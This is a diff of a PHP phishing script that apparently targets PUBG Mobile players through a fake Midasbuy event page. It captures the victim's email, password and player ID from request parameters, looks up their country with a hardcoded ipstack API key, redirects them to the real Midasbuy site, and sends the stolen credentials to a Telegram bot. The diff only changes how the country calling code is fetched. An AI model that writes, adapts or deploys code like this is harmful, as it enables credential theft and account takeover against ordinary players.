@@ -36,15 +36,20 @@ $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
 $playid = $_GET['playid'];
-$callingcode = $_GET['country_code'];
-$linky = $_SERVER['HTTP_HOST'];
 
+$linky = $_SERVER['HTTP_HOST'];
+$code4 = file_get_contents('https://ipapi.co/8.8.8.8/json/');
+$jsondata = json_decode($code4);
+$code = $jsondata->country_calling_code;
 if($email){
 $api_key = "26dc150b1cf3c41dc866400812300e6d";
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
-$code = $jsondata->calling_code;
+
+    
+
+
 $url1 = "https://www.midasbuy.com/events/register/pubgm?lan=en&v=4&from=__mds_buy_banner.events";
 header("location: $url1");
 $name = $message->from->first_name;
@@ -59,7 +64,7 @@ bot("sendMessage",[
    📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
    💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
    🏴 • 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » $cty
-   ☎️ • 𝙲𝚘𝚍𝚎 » $callingcode
+   ☎️ • 𝙲𝚘𝚍𝚎 » $code
    ⏲️ • 𝚃𝚒𝚖𝚎 » $time
    📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
 ╰───────•𝙳𝙴𝚅 𝙱𝚈 @PHP505•───────╯
